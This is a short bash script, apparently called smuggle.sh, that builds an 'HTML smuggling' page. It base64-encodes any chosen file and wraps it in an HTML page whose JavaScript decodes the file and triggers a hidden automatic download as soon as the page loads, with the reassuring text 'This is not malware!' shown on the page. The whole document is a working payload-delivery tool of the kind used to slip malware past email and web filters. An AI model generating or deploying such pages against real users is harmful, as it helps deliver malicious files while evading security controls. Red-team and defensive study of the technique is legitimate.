#!/usr/bin/env bash

file="$1"

#Function to create the HTML file

create_html_file() {
    local b64="$1"
    local file_name="$2"
    local html_name="$3"
    local content="<!DOCTYPE html>
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is not malware!</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file = '$b64';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = '$file_name';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>"

    echo "$content" > "$html_name.html"
    echo "HTML Smuggling file '$html_name.html' created successfully!"
}

# Check if a filename is provided as an argument or using -o option
if [ $# -eq 0 ]; then 
    echo "Usage: ./smuggle.sh <file> -f <filename to be downloaded> -o <html filename>"
    exit 0
elif [ $# -eq 1 ]; then
    # Default name
    html_name="smuggle"
    file_name="$file"
elif [ "$2" = "-f" ] && [ "$4" = "-o" ] && [ $# -ge 5 ]; then
    html_name="$5"
    file_name="$3"
elif [ "$2" = "-f" ] && [ $# -ge 3 ]; then
    html_name="smuggle"
    file_name="$3"
else
    echo "Invalid arguments!"
    exit 1
fi

#transform the file to b64
b64=$(cat "$file" | base64 | tr -d '\n')

#Call the function to create the HTML file
create_html_file "$b64" "$file_name" "$html_name"
